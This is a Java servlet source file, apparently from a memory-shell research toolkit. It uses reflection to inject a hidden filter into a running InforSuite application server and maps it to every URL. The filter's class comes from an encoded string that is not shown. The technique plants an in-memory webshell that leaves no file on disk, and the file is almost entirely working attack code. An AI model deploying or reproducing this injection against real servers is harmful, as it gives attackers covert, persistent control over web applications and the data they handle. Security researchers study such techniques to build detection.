package org.su18.memshell.test.inforsuite;

import com.cvicse.loong.enterprise.web.WebModule;
import org.apache.catalina.deploy.FilterDef;
import org.apache.catalina.deploy.FilterMap;

import javax.servlet.DispatcherType;
import javax.servlet.Filter;
import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.List;

import static org.su18.memshell.test.inforsuite.DynamicUtils.FILTER_CLASS_STRING;

/**
 * 真垃圾，mac 上部署个项目都部不起来，浪费我好多时间
 * 测试版本：InforSuiteAS_10
 *
 * @author su18
 */

public class AddInforSuiteFilter extends HttpServlet {

	@Override
	protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {


		String         filterName     = "su18InforSuiteFilter";
		ServletContext servletContext = req.getServletContext();

		WebModule context = null;

		try {

			// 获取 Context
			while (context == null) {
				Field f = servletContext.getClass().getDeclaredField("context");
				f.setAccessible(true);
				Object object = f.get(servletContext);

				if (object instanceof WebModule) {
					context = (WebModule) object;
				} else if (object instanceof ServletContext) {
					servletContext = (ServletContext) object;
				}
			}

			// 创建自定义 Filter 对象
			Filter filter = (Filter) DynamicUtils.getClass(FILTER_CLASS_STRING).newInstance();

			// 创建 FilterDef 对象
			FilterDef filterDef = new FilterDef();
			filterDef.setFilterName(filterName);
			filterDef.setFilter(filter);
//			filterDef.setFilterClass(filter.getClass());

			// 创建 ApplicationFilterConfig 对象
			Constructor<?>[] constructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructors();
			constructor[0].setAccessible(true);
			Object config = constructor[0].newInstance(context, filterDef);

			// 创建 FilterMap 对象
			FilterMap filterMap = new FilterMap();
			filterMap.setFilterName(filterName);
			filterMap.setURLPattern("/*");
			HashSet<DispatcherType> set = new HashSet<>();
			set.add(DispatcherType.REQUEST);
			filterMap.setDispatcherTypes(set);


			// 反射将 ApplicationFilterConfig 放入 StandardContext 中的 filterConfigs 中
			Field filterConfigsField = context.getClass().getSuperclass().getSuperclass().getDeclaredField("filterConfigs");
			filterConfigsField.setAccessible(true);
			HashMap<String, Object> filterConfigs = (HashMap<String, Object>) filterConfigsField.get(context);
			filterConfigs.put(filterName, config);

			// 反射将 FilterMap 放入 StandardContext 中的 filterMaps 中
			Field filterMapField = context.getClass().getSuperclass().getSuperclass().getDeclaredField("filterMaps");
			filterMapField.setAccessible(true);
			List<FilterMap> object = (List<FilterMap>) filterMapField.get(context);

			object.add(filterMap);

			resp.getWriter().println("inforsuite filter added");

		} catch (Exception e) {
			e.printStackTrace();
		}

	}
}
